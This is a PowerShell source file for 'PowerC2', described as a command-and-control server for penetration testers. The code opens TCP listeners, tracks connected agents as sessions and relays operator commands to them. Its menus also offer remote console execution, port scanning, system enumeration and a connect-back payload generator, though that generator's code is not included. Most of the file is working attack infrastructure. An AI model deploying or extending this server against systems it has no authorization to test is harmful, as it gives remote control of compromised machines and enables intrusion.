<#
	.AUTHOR
	Tad Miller (https://github.com/tadmiller)

	.SYNOPSIS
	PowerShell-based Command & Control Server designed for pentesters

	.DESCRIPTION
	This server provides a simple interface in which an individual can conduct C2 operations.
	It provides basic functionality that a Pentester might need, implemented client side.

	.COMPATIBILITY
	Developed on PowerShell 5

	.EXAMPLE
	.\PowerC2.ps1

	Initializing Shell.........OK
	__________                            _________  ________  
	\______   \______  _  __ ___________  \_   ___ \ \_____  \ 
	 |     ___/  _ \ \/ \/ // __ \_  __ \ /    \  \/  /  ____/ 
	 |    |  (  <_> )     /\  ___/|  | \/ \     \____/       \ 
	 |____|   \____/ \/\_/  \___  >__|     \______  /\_______ \
								\/                \/         \/
	Welcome to Power C2
	Type HELP to list the commands available

	$: lis 9001

	Started listener on 0.0.0.0:9001

	$: ses

	0	 127.0.0.1 : 51069

	$: use 0

	Using session 0

	 0\>: whoami

	BOBS-PC\bob

	 0\>: ret

	Leaving session active...

	.LINK
	https://github.com/tadmiller/PowerC2/
#>

$MENU_CMDS = @{}
$SESSION_CMDS = @{}

# Active targets
$TARGET_LISTENERS = New-Object System.Collections.ArrayList
$TARGET_RUNSPACES = New-Object System.Collections.ArrayList
$TARGETS_ACTIVE = New-Object System.Collections.ArrayList

# PowerShell processes active for both targets and clients
$ACTIVE_PROCS = New-Object System.Collections.ArrayList

# Active clients (controllers)
$CLIENT_PORT = Get-Random -Minimum 1025 -Maximum 65534
$CLIENTS_ACTIVE = New-Object System.Collections.ArrayList
$CLIENT_RUNSPACES = New-Object System.Collections.ArrayList

function CheckListener($listener)
{
	if ($listener -eq $null)
	{
		exit 1
	}

	if ($listener.GetType() -ne [System.Net.Sockets.TcpListener])
	{
		Write-Host -ForegroundColor Red "Listener is not a tcp listener. It is" $listener.GetType()
		exit 1
	}	
}

# Not working
function GetClient($listener)
{
	while ($true)
	{
		Write-Host -ForegroundColor Magenta "Awaiting client connection..."

		$client = $listener.AcceptTcpClient()

		if ($client -ne $null)
		{
			break
		}
	}

	return $client
}

# Listen on an arbitrary port for a target. Upon connection, add them to a list of targets.
$TARGET_FINDER = {
	CheckListener $listener

	while ($true)
	{
		Write-Host -ForegroundColor Magenta "Awaiting client connection..."

		$client = $listener.AcceptTcpClient()

		if ($client -ne $null)
		{
			$TARGETS_ACTIVE.Add($client)
		}
	}
}

# Listen on an arbitrary port for a target. Upon connection, add them to a list of targets.
$CLIENT_FINDER = {
	CheckListener $listener

	while ($true)
	{
		Write-Host -ForegroundColor Magenta "Awaiting client connection..."

		$client = $listener.AcceptTcpClient()

		if ($client -ne $null)
		{
			$CLIENTS_ACTIVE.Add($client)
		}
	}
}

# Gracefully close each listener, client connection, and runspace.
function ExitC2()
{
	Write-Host ""
	Write-Host -ForegroundColor Red "Exiting Application..."

	foreach ($l in $TARGETS_ACTIVE)
	{
		if ($l -ne $null)
		{
			$stream = $l.GetStream()
			SendMessage $stream "quit"
			$stream.Dispose() > $null
			$l.Dispose() > $null
		}
	}

	foreach ($l in $TARGET_LISTENERS)
	{
		if ($l -ne $null)
		{
			if ($l.GetType() -eq [System.Net.Sockets.TcpListener])
			{
				$l.Stop() > $null
			}
		}
	}

	foreach ($l in $TARGET_RUNSPACES)
	{
		if ($l -ne $null)
		{
			$l.Dispose() > $null
		}
	}

	foreach ($l in $ACTIVE_PROCS)
	{
		if ($l -ne $null)
		{
			$l.Dispose() > $null
		}
	}



	exit 1 > $null
}

# Display help nemu
function MenuHelp()
{
	Write-Host "`n"
	$out = $MENU_CMDS.GetEnumerator() | % { $_.Key + "`t | `t" + $_.Value } | Out-String
	Write-Host -Foreground Yellow $out
	Write-Host "`n"
}

# Display options for session commands
function SessionHelp()
{
	Write-Host "`n"
	$out = $SESSION_CMDS.GetEnumerator() | % { $_.Key + "`t | `t" + $_.Value } | Out-String
	Write-Host -Foreground Yellow $out
	Write-Host "`n"
}

function AddTargetListener($port)
{
	$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
	Write-Host -ForegroundColor Yellow "`nStarted listener on" $listener.LocalEndpoint
	#Write-Host -Foreground Yellow $listener.LocalEndpoint "active"
	$listener.Start()
	$TARGET_LISTENERS.Add($listener) > $null

	$runSpace = [RunSpaceFactory]::CreateRunspace()
	$runSpace.Open()
	$runSpace.SessionStateProxy.SetVariable("TARGET_LISTENERS", $TARGET_LISTENERS)
	$runSpace.SessionStateProxy.SetVariable("TARGETS_ACTIVE", $TARGETS_ACTIVE)
	$runSpace.SessionStateProxy.SetVariable("Listener", $listener)
	$PS = [PowerShell]::Create()
	$PS.Runspace = $runSpace
	$PS.AddScript($TARGET_FINDER).BeginInvoke() > $null
	$TARGET_RUNSPACES.Add($runSpace) > $null
	$ACTIVE_PROCS.Add($PS) > $null
}
<#
function AddClientListener($port)
{
	$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
	Write-Host -ForegroundColor Yellow "`nStarted listener on" $listener.LocalEndpoint

	$listener.Start()
	$CLIENT_LISTENERS.Add($listener) > $null

	$runSpace = [RunSpaceFactory]::CreateRunspace()
	$runSpace.Open()
	$runSpace.SessionStateProxy.SetVariable("TARGET_LISTENERS", $CLIENT_LISTENERS)
	$runSpace.SessionStateProxy.SetVariable("TARGETS_ACTIVE", $CLIENTS_ACTIVE)
	$runSpace.SessionStateProxy.SetVariable("Listener", $listener)
	$PS = [PowerShell]::Create()
	$PS.Runspace = $runSpace
	$PS.AddScript($CLIENT_FINDER).BeginInvoke() > $null
	$CLIENT_RUNSPACES.Add($runSpace) > $null
	$ACTIVE_PROCS.Add($PS) > $null
}
#>
# List the currently active sessions connected to this server.
function ListShells()
{
	Write-Host ""
	$i = 0

	Write-Host -ForegroundColor Cyan "#`t IP Address`t   Port"
	foreach ($t in $TARGETS_ACTIVE)
	{
		if ($t -ne $null)
		{
			if ($t.GetType() -eq [System.Net.Sockets.TcpClient])
			{
				Write-Host -Foreground Yellow "$i`t"$t.Client.RemoteEndPoint.Address" "$t.Client.LocalEndPoint.Port
				$i++
			}
		}
	}
}

# List the currently active listeners on this server.
function ListListeners()
{
	Write-Host -Foreground Cyan "`nListing active listeners`n"
	foreach ($t in $TARGET_LISTENERS)
	{
		if ($t -ne $null -and $t.GetType() -eq [System.Net.Sockets.TcpListener])
		{
			Write-Host -Foreground Yellow $t.LocalEndpoint
		}
	}
}

# Send a message over a data stream to a client.
function SendMessage($stream, $msg)
{
	$data = [text.Encoding]::Ascii.GetBytes($msg)
	$stream.Write($data, 0, $data.length)
	$stream.Flush()
}

# Receive a message over a data stream, and return it.
function ReceiveData($stream, $buffer)
{
	do {
			$return = $stream.Read($buffer, 0, $buffer.Length)
			$msg += [text.Encoding]::Ascii.GetString($buffer[0..($return-1)])   
	} while ($stream.DataAvailable)

	return $msg
}

# Given an active session / shell, switch to it and allow the user to interact with it.
function UseShell($num)
{
	# Make sure that we don't iterate over the length of the list of clients.
	if ($num -ge $TARGETS_ACTIVE.Length)
	{
		Write-Host -ForegroundColor Red "No such client is available"
		return
	}

	$client = $TARGETS_ACTIVE.Item($num -as [int])

	# If the client is null, then we don't want to attempt to invoke functions on it.
	if ($client -eq $null)
	{
		Write-Host -ForegroundColor Red "No such client is available"
		return
	}

	Write-Host -ForegroundColor Yellow "`nUsing session" $num

	# Get the data stream between the client and the server.
	$stream = $client.GetStream()
	[byte[]] $buffer = New-Object byte[] 5KB

	# Get a command from the application user, and execute it on the C2 agent.
	do
	{
		$msg = Read-Host "`n"$num"\>"

		if ($msg -eq "help") 
		{
			SessionHelp
		}
		else
		{
			SendMessage $stream $msg
			$res = ReceiveData $stream $buffer
			Write-Host ""
			Write-Host -ForegroundColor Cyan $res
		}

	} while ($msg -ne "ret" -and $msg -ne "quit")

	# If quitting the session, we need to remove it a list of active sessions, and close the client connection properly.
	if ($msg -eq "quit")
	{
		$stream.Dispose()
		$client.Dispose()
		$TARGETS_ACTIVE.RemoveAt($num -as [int])
	}
}

# For some fun in loading
function LoadHelper()
{
	Start-Sleep -m 40
	Write-Host -ForegroundColor Yellow -NoNewLine "."
}

function InitClient()
{
	
}

# The application shell
function InitMenu()
{
	Write-Host ""
	Write-Host -ForegroundColor Yellow -NoNewLine "Initializing Shell"

	LoadHelper
	$MENU_CMDS.Add("HELP",  "Lists commands available on the current menu.")
	$MENU_CMDS.Add("LIS x", "Sets up a listener on port x.")
	$MENU_CMDS.Add("LIS",   "Lists all active listeners on the C2.")
	$MENU_CMDS.Add("SES",   "Lists the shells available from hosts connected to the server.")
	$MENU_CMDS.Add("QUIT",  "Exit the application.")
	$MENU_CMDS.Add("USE x", "Select an active session to use and switch to its context.")
	$MENU_CMDS.Add("GEN",   "Generate a PowerShell payload that connects back on an arbitrary port. Will establish a listener on that port.")
	LoadHelper

	$SESSION_CMDS.Add("HELP    ", "Lists commands available on the current menu.")
	$SESSION_CMDS.Add("LS      ", "Lists current directory C2 agent is running from.")
	$SESSION_CMDS.Add("EXIT    ", "Exit from the current session, and exit the agent running on the client.")
	$SESSION_CMDS.Add("PWD     ", "Print the present working directory which the C2 Agent is running from.")
	$SESSION_CMDS.Add("CD <TARGET>", "Change directories, according to the target name. .. specifies the parent directory.")
	$SESSION_CMDS.Add("GETOS      ", "Get all infomration about the operating system.")
	$SESSION_CMDS.Add("GETPATCH   ", "Retrieve information available from the operating system about the current patches/hotfixes installed.")
	$SESSION_CMDS.Add("WHOAMI     ", "Return the account under which the C2 Agent is running.")
	$SESSION_CMDS.Add("NETSTAT    ", "List the active network connections on the computer running the C2 Agent.")
	$SESSION_CMDS.Add("SCAN *     ", "Run a port scan on target hosts. Parameters are: -Hosts IP -Ports PORT1, PORT2.")
	$SESSION_CMDS.Add("CONSOLE *  ", "Run a command in the console native to the OS which is hosting the C2 Agent.")
	$SESSION_CMDS.Add("QUIT       ", "Exit the current session, and close the connection with the C2 Agent.")
	$SESSION_CMDS.Add("RET        ", "Return from the current session, and leave the connection with the C2 Agent active.")
	LoadHelper

	Write-Host -ForegroundColor Green "OK`n"

	Write-Host -ForegroundColor Magenta "
__________                            _________  ________  
\______   \______  _  __ ___________  \_   ___ \ \_____  \ 
 |     ___/  _ \ \/ \/ // __ \_  __ \ /    \  \/  /  ____/ 
 |    |  (  <_> )     /\  ___/|  | \/ \     \____/       \ 
 |____|   \____/ \/\_/  \___  >__|     \______  /\_______ \
							\/                \/         \/"

	Write-Host -Foreground Yellow "Welcome to Power C2"
	Write-Host -Foreground Yellow "Type HELP to list the commands available"

	Write-Host -Foreground Cyan "Listening on port" $CLIENT_PORT

	do
	{
		$msg = Read-Host "`n$"

		switch -Wildcard ($msg)
		{
			"help" {
				MenuHelp
				break
			}
			"lis" {
				ListListeners
				break
			}
			"lis*" {
				AddTargetListener $msg.SubString(3, $msg.Length - 3)
				break
			}
			"ses" {
				ListShells
				break
			}
			"gen" {
				GeneratePayload
				break
			}
			"use*" {
				UseShell $msg.SubString(4, $msg.Length - 4) -as [int]
				break
			}
		}
	} while ($msg -ne "q" -and $msg -ne "quit" -and $msg -ne "exit")

	ExitC2
}

InitClient
InitMenu